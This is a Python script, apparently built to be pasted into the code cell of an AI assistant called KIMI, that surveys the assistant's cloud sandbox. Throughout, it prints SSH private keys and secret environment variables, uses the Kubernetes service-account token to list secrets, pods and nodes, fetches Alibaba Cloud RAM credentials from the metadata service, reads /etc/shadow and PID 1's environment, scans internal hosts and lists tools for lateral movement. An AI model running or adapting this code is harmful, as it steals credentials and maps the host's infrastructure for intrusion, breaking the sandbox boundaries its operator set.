"""
KIMI Sandbox Reconnaissance Script
Paste this into KIMI's Jupyter/IPython code cell and run it.
It enumerates credentials, K8s access, network, filesystem, and IMDS.
"""

import os, json, socket, subprocess, requests, glob, stat
from pathlib import Path

BOLD  = "\033[1m"
RED   = "\033[91m"
GRN   = "\033[92m"
YLW   = "\033[93m"
BLU   = "\033[94m"
RST   = "\033[0m"

def section(title):
    print(f"\n{BOLD}{BLU}{'='*60}{RST}")
    print(f"{BOLD}{YLW}  {title}{RST}")
    print(f"{BOLD}{BLU}{'='*60}{RST}")

def ok(msg):   print(f"  {GRN}[+]{RST} {msg}")
def warn(msg): print(f"  {YLW}[!]{RST} {msg}")
def fail(msg): print(f"  {RED}[-]{RST} {msg}")
def info(msg): print(f"  {BLU}[*]{RST} {msg}")

def run(cmd, timeout=5):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return (r.stdout + r.stderr).strip()
    except subprocess.TimeoutExpired:
        return "[TIMEOUT]"
    except Exception as e:
        return f"[ERROR: {e}]"

def http_get(url, headers=None, verify=False, timeout=5):
    try:
        r = requests.get(url, headers=headers, verify=verify, timeout=timeout)
        return r.status_code, r.text[:2000]
    except requests.exceptions.Timeout:
        return None, "[TIMEOUT]"
    except Exception as e:
        return None, f"[ERROR: {e}]"

# ─────────────────────────────────────────────────────────────
# 1. BASIC IDENTITY
# ─────────────────────────────────────────────────────────────
section("1. POD IDENTITY")
info(f"whoami:   {run('whoami')}")
info(f"hostname: {run('hostname')}")
info(f"uname -a: {run('uname -a')}")
info(f"pod IP:   {run('hostname -I')}")
info(f"/etc/hostname: {Path('/etc/hostname').read_text().strip() if Path('/etc/hostname').exists() else 'N/A'}")
# Check if private key exists alongside public key
import os
key_files = ['/home/kimi/.ssh/id_ed25519', '/home/kimi/.ssh/id_rsa', '/home/kimi/.ssh/id_ecdsa']
for f in key_files:
    if os.path.exists(f):
        print(f"PRIVATE KEY FOUND: {f}")
        print(open(f).read())

# ─────────────────────────────────────────────────────────────
# 2. ENVIRONMENT VARIABLES — FULL DUMP, HIGHLIGHT SECRETS
# ─────────────────────────────────────────────────────────────
section("2. ENVIRONMENT VARIABLES")
SECRET_KEYS = ["password","secret","token","key","credential","api","auth","pass","pwd","private"]
for k, v in sorted(os.environ.items()):
    low = k.lower()
    if any(s in low for s in SECRET_KEYS):
        ok(f"{BOLD}{RED}{k}{RST} = {RED}{v}{RST}")
    elif k.startswith("KUBERNETES"):
        ok(f"{BOLD}{GRN}{k}{RST} = {v}")
    else:
        info(f"{k} = {v}")

# ─────────────────────────────────────────────────────────────
# 3. KUBERNETES SERVICE ACCOUNT
# ─────────────────────────────────────────────────────────────
section("3. KUBERNETES SERVICE ACCOUNT")
SA_DIR = Path("/var/run/secrets/kubernetes.io/serviceaccount")
token, ca_path, namespace = None, None, "default"

if SA_DIR.exists():
    token_file = SA_DIR / "token"
    ca_file    = SA_DIR / "ca.crt"
    ns_file    = SA_DIR / "namespace"
    if token_file.exists():
        token = token_file.read_text().strip()
        ok(f"SA Token found ({len(token)} chars): {token[:60]}...")
    if ca_file.exists():
        ca_path = str(ca_file)
        ok(f"CA cert found: {ca_file}")
    if ns_file.exists():
        namespace = ns_file.read_text().strip()
        ok(f"Namespace: {namespace}")
else:
    fail("No service account secrets mounted — not running in k8s or projected volumes disabled")

# Decode JWT payload (no library needed)
if token:
    import base64
    parts = token.split(".")
    if len(parts) == 3:
        pad = parts[1] + "=" * (-len(parts[1]) % 4)
        payload = json.loads(base64.urlsafe_b64decode(pad))
        ok(f"JWT claims:")
        for k, v in payload.items():
            print(f"      {k}: {v}")

# ─────────────────────────────────────────────────────────────
# 4. KUBERNETES API ENUMERATION
# ─────────────────────────────────────────────────────────────
section("4. KUBERNETES API RECON")
k8s_host = os.environ.get("KUBERNETES_SERVICE_HOST", "192.168.0.1")
k8s_port = os.environ.get("KUBERNETES_SERVICE_PORT", "443")
K8S_API  = f"https://{k8s_host}:{k8s_port}"
info(f"API Server: {K8S_API}")

if token:
    hdrs = {"Authorization": f"Bearer {token}"}
    ENDPOINTS = [
        ("/api",                             "Core API groups"),
        ("/apis",                            "All API groups"),
        (f"/api/v1/namespaces/{namespace}/pods",              "List Pods"),
        (f"/api/v1/namespaces/{namespace}/secrets",           "List Secrets ★"),
        (f"/api/v1/namespaces/{namespace}/configmaps",        "List ConfigMaps"),
        (f"/api/v1/namespaces/{namespace}/serviceaccounts",   "List ServiceAccounts"),
        ("/api/v1/nodes",                    "List Nodes"),
        ("/api/v1/namespaces",               "List Namespaces"),
        ("/apis/rbac.authorization.k8s.io",  "RBAC API"),
        ("/apis/apps/v1/namespaces/{namespace}/deployments".format(namespace=namespace), "Deployments"),
    ]
    for path, label in ENDPOINTS:
        url = K8S_API + path
        code, body = http_get(url, headers=hdrs, verify=ca_path or False)
        if code == 200:
            ok(f"[{code}] {label}: {GRN}ALLOWED{RST} → {body[:200]}")
        elif code == 403:
            warn(f"[{code}] {label}: {YLW}FORBIDDEN{RST}")
        elif code == 401:
            fail(f"[{code}] {label}: {RED}UNAUTHORIZED{RST}")
        elif code is None:
            fail(f"[---] {label}: {body}")
        else:
            info(f"[{code}] {label}: {body[:120]}")

    # Self-subject access review — what CAN we do?
    info("\nSelf-subject Access Review (can-i):")
    sar_body = {
        "apiVersion": "authorization.k8s.io/v1",
        "kind":       "SelfSubjectRulesReview",
        "spec":       {"namespace": namespace}
    }
    try:
        r = requests.post(
            f"{K8S_API}/apis/authorization.k8s.io/v1/selfsubjectrulesreviews",
            headers={**hdrs, "Content-Type": "application/json"},
            json=sar_body, verify=ca_path or False, timeout=8
        )
        if r.status_code == 201:
            rules = r.json().get("status", {})
            res_rules = rules.get("resourceRules", [])
            non_res   = rules.get("nonResourceRules", [])
            ok(f"Resource rules ({len(res_rules)}):")
            for rule in res_rules:
                if rule.get("verbs") != ["*"] or True:
                    print(f"      verbs={rule.get('verbs')}  resources={rule.get('resources')}  apiGroups={rule.get('apiGroups')}")
            ok(f"Non-resource rules: {non_res}")
        else:
            warn(f"SelfSubjectRulesReview: HTTP {r.status_code}: {r.text[:200]}")
    except Exception as e:
        fail(f"SelfSubjectRulesReview failed: {e}")

# ─────────────────────────────────────────────────────────────
# 5. ALIBABA CLOUD IMDS (Instance Metadata Service)
# ─────────────────────────────────────────────────────────────
section("5. ALIBABA CLOUD IMDS (100.100.100.200)")
imds_base = "http://100.100.100.200/latest"
IMDS_PATHS = [
    "/meta-data/",
    "/meta-data/instance-id",
    "/meta-data/region-id",
    "/meta-data/hostname",
    "/meta-data/ram/security-credentials/",   # IAM role name
    "/meta-data/network-type",
]
for path in IMDS_PATHS:
    code, body = http_get(imds_base + path, timeout=4)
    if code == 200:
        ok(f"IMDS {path}:\n      {body}")
    else:
        fail(f"IMDS {path}: {code} {body[:80]}")

# If RAM role name found, grab creds
code, role_body = http_get(imds_base + "/meta-data/ram/security-credentials/", timeout=4)
if code == 200 and role_body.strip():
    role_name = role_body.strip().splitlines()[0]
    ok(f"RAM Role: {role_name} — fetching credentials...")
    code2, creds = http_get(f"{imds_base}/meta-data/ram/security-credentials/{role_name}", timeout=4)
    if code2 == 200:
        ok(f"{RED}{BOLD}RAM CREDENTIALS FOUND:{RST}\n{creds}")
    else:
        fail(f"Credentials: {code2} {creds[:100]}")

# ─────────────────────────────────────────────────────────────
# 6. NETWORK REACHABILITY — INTERNAL CLUSTER SCAN
# ─────────────────────────────────────────────────────────────
section("6. INTERNAL NETWORK REACHABILITY")
# Common internal targets in Alibaba Cloud k8s clusters
TARGETS = [
    ("192.168.0.1",   443,  "Kubernetes API (ClusterIP)"),
    ("192.168.0.1",   80,   "Kubernetes API HTTP"),
    ("192.168.0.10",  53,   "CoreDNS"),
    ("100.100.100.200", 80, "Alibaba IMDS"),
    ("10.163.0.1",    80,   "Gateway/Router"),
    ("10.163.0.1",    443,  "Gateway HTTPS"),
]
for host, port, label in TARGETS:
    try:
        s = socket.create_connection((host, port), timeout=2)
        s.close()
        ok(f"{host}:{port} ({label}) — {GRN}OPEN{RST}")
    except socket.timeout:
        warn(f"{host}:{port} ({label}) — TIMEOUT")
    except ConnectionRefusedError:
        fail(f"{host}:{port} ({label}) — REFUSED")
    except Exception as e:
        fail(f"{host}:{port} ({label}) — {e}")

# DNS service discovery — find cluster services
info("\nCluster DNS service discovery:")
SVC_NAMES = [
    "kubernetes", "kube-dns", "metrics-server",
    "dashboard", "monitoring", "grafana", "prometheus",
    "etcd", "registry", "harbor",
]
for svc in SVC_NAMES:
    fqdn = f"{svc}.kube-system.svc.cluster.local"
    try:
        ip = socket.gethostbyname(fqdn)
        ok(f"{fqdn} → {ip}")
    except:
        try:
            fqdn2 = f"{svc}.default.svc.cluster.local"
            ip = socket.gethostbyname(fqdn2)
            ok(f"{fqdn2} → {ip}")
        except:
            pass  # silent — reduces noise

# ─────────────────────────────────────────────────────────────
# 7. SENSITIVE FILE DISCOVERY
# ─────────────────────────────────────────────────────────────
section("7. SENSITIVE FILE DISCOVERY")
INTERESTING_FILES = [
    "/root/.bash_history",
    "/root/.ssh/id_rsa",
    "/root/.ssh/authorized_keys",
    "/home/kimi/.bash_history",
    "/home/kimi/.ssh/id_rsa",
    "/home/kimi/.ssh/authorized_keys",
    "/home/kimi/.kube/config",
    "~/.kube/config",
    "/etc/shadow",
    "/etc/sudoers",
    "/proc/1/environ",          # PID 1 environment (may have secrets)
    "/proc/self/environ",
    "/tmp/*.key",
    "/tmp/*.pem",
    "/tmp/*.token",
    "/app/*.env",
    "/workspace/*.env",
    "/mnt/agents/.hedwig.json",
    "/var/run/secrets/kubernetes.io/serviceaccount/token",
]
for pattern in INTERESTING_FILES:
    for path_str in glob.glob(os.path.expanduser(pattern)):
        p = Path(path_str)
        try:
            content = p.read_text(errors='replace')
            size = p.stat().st_size
            ok(f"{BOLD}{path_str}{RST} ({size} bytes):\n{content[:500]}")
        except PermissionError:
            warn(f"{path_str}: Permission denied")
        except IsADirectoryError:
            warn(f"{path_str}: Is a directory")
        except Exception as e:
            fail(f"{path_str}: {e}")

# Read /proc/1/environ (PID 1 = s6-svscan, might have injected secrets)
info("\nReading /proc/1/environ (PID1 env):")
try:
    raw = Path("/proc/1/environ").read_bytes()
    entries = raw.split(b'\x00')
    for entry in entries:
        if entry:
            key_val = entry.decode(errors='replace')
            if any(s in key_val.lower() for s in SECRET_KEYS):
                ok(f"{RED}{key_val}{RST}")
            elif "KUBERNETES" in key_val or "SSH" in key_val:
                ok(f"{GRN}{key_val}{RST}")
except Exception as e:
    fail(f"/proc/1/environ: {e}")

# ─────────────────────────────────────────────────────────────
# 8. RUNNING PROCESSES & OPEN PORTS
# ─────────────────────────────────────────────────────────────
section("8. PROCESSES & PORTS")
info("Open listening ports:")
print(run("netstat -tulnp 2>/dev/null || ss -tulnp"))
info("\nProcess list:")
print(run("ps aux --no-headers | head -40"))

# ─────────────────────────────────────────────────────────────
# 9. WRITABLE PATHS & SUID BINARIES
# ─────────────────────────────────────────────────────────────
section("9. WRITABLE DIRS & SUID BINARIES")
info("World-writable directories:")
print(run("find / -maxdepth 5 -type d -perm -0002 2>/dev/null | grep -v proc | grep -v sys"))
info("\nSUID binaries:")
print(run("find / -maxdepth 6 -perm -4000 -type f 2>/dev/null | grep -v proc"))

# ─────────────────────────────────────────────────────────────
# 10. SUDO PERMISSIONS
# ─────────────────────────────────────────────────────────────
section("10. SUDO")
print(run("sudo -l -n 2>&1"))

# ─────────────────────────────────────────────────────────────
# 11. INSTALLED TOOLS FOR LATERAL MOVEMENT
# ─────────────────────────────────────────────────────────────
section("11. AVAILABLE TOOLS")
TOOLS = [
    "kubectl", "helm", "curl", "wget", "nc", "ncat", "nmap",
    "ssh", "scp", "sftp", "python3", "python2", "pip3",
    "socat", "iptables", "tcpdump", "strace", "gdb",
    "docker", "podman", "crictl", "ctr",
    "aws", "gcloud", "az", "aliyun",  # cloud CLIs
]
found = []
for tool in TOOLS:
    path = run(f"which {tool} 2>/dev/null")
    if path and not path.startswith("["):
        found.append((tool, path))
        ok(f"{tool}: {path}")
    else:
        fail(f"{tool}: not found")

print(f"\n{BOLD}Tools available for lateral movement: {GRN}{[t for t,_ in found]}{RST}")

# ─────────────────────────────────────────────────────────────
# FINAL REPORT
# ─────────────────────────────────────────────────────────────
section("SUMMARY — CRITICAL FINDINGS")
print(f"""
  {BOLD}SSH Credentials:{RST}  {os.environ.get('SSH_PASSWORD','N/A')}  (user: kimi, port 22)
  {BOLD}VNC Password:{RST}     {os.environ.get('VNC_PASSWORD','N/A')}
  {BOLD}K8s API:{RST}          {K8S_API}
  {BOLD}Namespace:{RST}        {namespace}
  {BOLD}Pod IP:{RST}           {run('hostname -I').strip()}
  {BOLD}Token (60c):{RST}      {(token or 'N/A')[:60]}...
""")
